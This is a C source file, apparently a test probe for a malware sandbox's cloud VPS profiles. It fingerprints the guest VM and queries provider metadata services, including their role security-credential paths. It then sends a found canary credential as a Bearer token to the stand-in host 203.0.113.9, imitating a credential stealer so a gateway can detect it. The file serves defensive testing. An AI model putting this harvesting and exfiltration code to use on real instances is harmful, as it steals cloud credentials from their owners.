/* SPDX-License-Identifier: GPL-3.0-only */
/* Copyright (c) 2026 MikiMiku (MoreMorePwn) */
/*
 * Guest probe for the cloud VPS profiles: what a sample on a cloud instance
 * reads of its machine, and what the provider's metadata service tells it.
 * It is launched as the sample (a run) and prints one line per fact:
 *
 *   CLOUD <key> <value>
 *
 * keys: dmi.*, cpu.hypervisor, clocksource, pci (vendor:device lines), net.*
 * (MAC, addresses, gateway, DNS), dns.* (the Tencent metadata name), then
 * meta.* for every metadata path tried on every provider's address. Last it
 * does what a credential stealer does with what it found: sends the first
 * canary-looking credential in a plain HTTP request to 203.0.113.9, so the
 * gateway can see the use. "STEALTH-END" ends the output (the run driver
 * waits for it).
 *
 * Build: cc -static -O2 -Wall -Wextra -Werror tests/monitor/cloud-probe.c
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <unistd.h>

static char canary[256];

static void line(const char *key, const char *value)
{
	char clean[300];
	size_t i, n = 0;

	for (i = 0; value && value[i] && n < sizeof(clean) - 1; i++) {
		unsigned char c = value[i];

		clean[n++] = (c == '\n' || c == '\r' || c == '\t') ? ' ' : (c < 0x20 || c > 0x7e) ? '?' : c;
	}
	clean[n] = 0;
	printf("CLOUD %s %s\n", key, clean);
	fflush(stdout);
}

static void file(const char *key, const char *path)
{
	char buf[256];
	FILE *f = fopen(path, "r");

	if (!f) {
		line(key, "(unreadable)");
		return;
	}
	if (!fgets(buf, sizeof(buf), f))
		buf[0] = 0;
	fclose(f);
	buf[strcspn(buf, "\n")] = 0;
	line(key, buf);
}

static int connect_to(const char *ip, int port)
{
	struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(port) };
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	struct timeval tv = { .tv_sec = 3 };

	if (fd < 0 || inet_pton(AF_INET, ip, &sa.sin_addr) != 1)
		return -1;
	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
	if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		close(fd);
		return -1;
	}
	return fd;
}

/* One HTTP GET; the response (head and body) in out, NUL-terminated. */
static int http_get(const char *ip, const char *path, const char *extra, char *out, size_t size)
{
	char request[1024];
	size_t used = 0;
	int fd = connect_to(ip, 80);
	ssize_t got;

	if (fd < 0)
		return -1;
	snprintf(request, sizeof(request),
		 "GET %s HTTP/1.1\r\nHost: %s\r\n%sConnection: close\r\n\r\n", path, ip,
		 extra ? extra : "");
	if (write(fd, request, strlen(request)) < 0) {
		close(fd);
		return -1;
	}
	while (used + 1 < size && (got = read(fd, out + used, size - 1 - used)) > 0)
		used += (size_t)got;
	out[used] = 0;
	close(fd);
	return used ? 0 : -1;
}

static const char *body_of(const char *response)
{
	const char *at = strstr(response, "\r\n\r\n");

	return at ? at + 4 : response;
}

/* Remember the token around "ANTCANARY", as a stealer would copy a key. */
static void find_canary(const char *body)
{
	const char *at = strcasestr(body, "ANTCANARY");
	const char *s, *e;

	if (!at || canary[0])
		return;
	at = at ? at : body;
	s = at;
	while (s > body && (s[-1] == '.' || s[-1] == '_' || s[-1] == '-' ||
			    (s[-1] >= '0' && s[-1] <= '9') || (s[-1] >= 'A' && s[-1] <= 'Z') ||
			    (s[-1] >= 'a' && s[-1] <= 'z')))
		s--;
	e = at;
	while (*e == '.' || *e == '_' || *e == '-' || (*e >= '0' && *e <= '9') ||
	       (*e >= 'A' && *e <= 'Z') || (*e >= 'a' && *e <= 'z'))
		e++;
	if ((size_t)(e - s) < sizeof(canary)) {
		memcpy(canary, s, (size_t)(e - s));
		canary[e - s] = 0;
	}
}

static void query(const char *ip, const char *path)
{
	static char response[8192];
	char key[160], status[64];
	const char *body;

	snprintf(key, sizeof(key), "meta.%s%s", ip, path);
	if (http_get(ip, path, NULL, response, sizeof(response)) < 0)
		return; /* no answer at that address: nothing to print */
	snprintf(status, sizeof(status), "%.12s", response);
	body = body_of(response);
	find_canary(body);
	{
		char text[300];

		snprintf(text, sizeof(text), "[%s] %.200s", status + 9, body);
		line(key, text);
	}
}

/* An A query to the first nameserver of resolv.conf (a static program has no
 * resolver library in a BusyBox guest). */
static void dns_lookup(const char *name)
{
	unsigned char q[300] = { 0x12, 0x34, 0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0 }, a[512];
	char buf[128], server[64] = "";
	struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(53) };
	struct timeval tv = { .tv_sec = 3 };
	size_t n = 12, i;
	const char *label = name;
	ssize_t got;
	FILE *f = fopen("/etc/resolv.conf", "r");
	int fd;
	char key[80];

	snprintf(key, sizeof(key), "dns.%s", name);
	while (f && fgets(buf, sizeof(buf), f))
		if (sscanf(buf, "nameserver %63s", server) == 1)
			break;
	if (f)
		fclose(f);
	if (!server[0] || inet_pton(AF_INET, server, &sa.sin_addr) != 1) {
		line(key, "(no nameserver)");
		return;
	}
	while (*label) {
		const char *dot = strchr(label, '.');
		size_t len = dot ? (size_t)(dot - label) : strlen(label);

		q[n++] = (unsigned char)len;
		memcpy(q + n, label, len);
		n += len;
		label += len + (dot ? 1 : 0);
		if (!dot)
			break;
	}
	q[n++] = 0;
	q[n++] = 0;
	q[n++] = 1;
	q[n++] = 0;
	q[n++] = 1;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	sendto(fd, q, n, 0, (struct sockaddr *)&sa, sizeof(sa));
	got = recv(fd, a, sizeof(a), 0);
	close(fd);
	if (got < (ssize_t)n + 16 || (a[3] & 0x0f) || !a[7]) {
		line(key, "(no answer)");
		return;
	}
	i = (size_t)got - 4;
	snprintf(buf, sizeof(buf), "%u.%u.%u.%u", a[i], a[i + 1], a[i + 2], a[i + 3]);
	line(key, buf);
}

static void pci(void)
{
	DIR *d = opendir("/sys/bus/pci/devices");
	struct dirent *e;

	if (!d) {
		line("pci", "(no PCI)");
		return;
	}
	while ((e = readdir(d))) {
		char path[300], vendor[16] = "", device[16] = "", sub[32] = "", text[300];
		FILE *f;

		if (e->d_name[0] == '.')
			continue;
		snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/vendor", e->d_name);
		f = fopen(path, "r");
		if (f) {
			if (fgets(vendor, sizeof(vendor), f))
				vendor[strcspn(vendor, "\n")] = 0;
			fclose(f);
		}
		snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/device", e->d_name);
		f = fopen(path, "r");
		if (f) {
			if (fgets(device, sizeof(device), f))
				device[strcspn(device, "\n")] = 0;
			fclose(f);
		}
		snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/subsystem_vendor", e->d_name);
		f = fopen(path, "r");
		if (f) {
			if (fgets(sub, sizeof(sub), f))
				sub[strcspn(sub, "\n")] = 0;
			fclose(f);
		}
		snprintf(text, sizeof(text), "%.64s %.8s:%.8s sub-vendor %.12s", e->d_name, vendor + 2,
			 device + 2, sub);
		line("pci", text);
	}
	closedir(d);
}

static void network(void)
{
	DIR *d = opendir("/sys/class/net");
	struct dirent *e;
	FILE *f;
	char buf[256];

	while (d && (e = readdir(d))) {
		char path[300];

		if (e->d_name[0] == '.' || !strcmp(e->d_name, "lo"))
			continue;
		snprintf(path, sizeof(path), "/sys/class/net/%s/device/vendor", e->d_name);
		if (access(path, R_OK))
			continue; /* tunnel devices have no PCI device */
		snprintf(path, sizeof(path), "/sys/class/net/%s/address", e->d_name);
		file("net.mac", path);
		snprintf(path, sizeof(path), "/sys/class/net/%s/device/vendor", e->d_name);
		file("net.vendor", path);
	}
	if (d)
		closedir(d);
	f = fopen("/proc/net/route", "r");
	while (f && fgets(buf, sizeof(buf), f)) {
		char iface[32];
		unsigned long dest, gw;

		if (sscanf(buf, "%31s %lx %lx", iface, &dest, &gw) == 3 && dest == 0 && gw) {
			struct in_addr a = { .s_addr = (in_addr_t)gw };

			line("net.gateway", inet_ntoa(a));
		}
	}
	if (f)
		fclose(f);
	f = fopen("/etc/resolv.conf", "r");
	while (f && fgets(buf, sizeof(buf), f)) {
		buf[strcspn(buf, "\n")] = 0;
		line("net.resolv", buf);
	}
	if (f)
		fclose(f);
	/* The interface address from the kernel's FIB, as ip addr shows it. */
	f = fopen("/proc/net/fib_trie", "r");
	while (f && fgets(buf, sizeof(buf), f)) {
		char *host = strstr(buf, "/32 host LOCAL");

		if (host && strstr(buf, "|--")) {
			buf[strcspn(buf, "\n")] = 0;
			line("net.fib", buf);
		}
	}
	if (f)
		fclose(f);
}

int main(void)
{
	static const char *const addresses[] = { "169.254.169.254", "169.254.0.23", "100.100.100.200" };
	static const char *const paths[] = {
		"/latest/meta-data/instance-id", "/latest/meta-data/hostname",
		"/latest/meta-data/region-id", "/latest/meta-data/placement/region",
		"/latest/meta-data/cam/security-credentials/",
		"/latest/meta-data/cam/security-credentials/CVMRole",
		"/latest/meta-data/ram/security-credentials/",
		"/latest/meta-data/ram/security-credentials/EcsRamRole", "/metadata/v1/id",
		"/metadata/v1/hostname", "/metadata/v1/region", "/metadata/v1/user-data",
		"/v1.json", "/v1/instanceid", "/latest/user-data",
	};
	static const char *const dmi[] = { "sys_vendor", "product_name", "product_version",
					   "product_family", "product_serial", "bios_vendor",
					   "bios_version", "bios_date", "board_vendor", "board_name",
					   "chassis_type", "chassis_vendor" };
	char path[160], buf[512], request[1100];
	FILE *f;
	size_t i, j;

	for (i = 0; i < sizeof(dmi) / sizeof(dmi[0]); i++) {
		char key[64];

		snprintf(key, sizeof(key), "dmi.%s", dmi[i]);
		snprintf(path, sizeof(path), "/sys/class/dmi/id/%s", dmi[i]);
		file(key, path);
	}
	f = fopen("/proc/cpuinfo", "r");
	int seen = 0;
	while (f && fgets(buf, sizeof(buf), f)) {
		if (!strncmp(buf, "flags", 5)) {
			line("cpu.hypervisor", strstr(buf, " hypervisor") ? "yes" : "no");
			seen = 1;
			break;
		}
	}
	if (f)
		fclose(f);
	if (!seen)
		line("cpu.hypervisor", "(no flags line)");
	file("clocksource", "/sys/devices/system/clocksource/clocksource0/current_clocksource");
	pci();
	network();
	dns_lookup("metadata.tencentyun.com");
	for (i = 0; i < sizeof(addresses) / sizeof(addresses[0]); i++)
		for (j = 0; j < sizeof(paths) / sizeof(paths[0]); j++)
			query(addresses[i], paths[j]);
	if (canary[0]) {
		snprintf(request, sizeof(request), "Authorization: Bearer %s\r\n", canary);
		http_get("203.0.113.9", "/api/v2/account", request, buf, sizeof(buf));
		line("canary.sent", "to 203.0.113.9:80");
	} else {
		line("canary.sent", "(no credential found)");
	}
	printf("STEALTH-END\n");
	fflush(stdout);
	return 0;
}
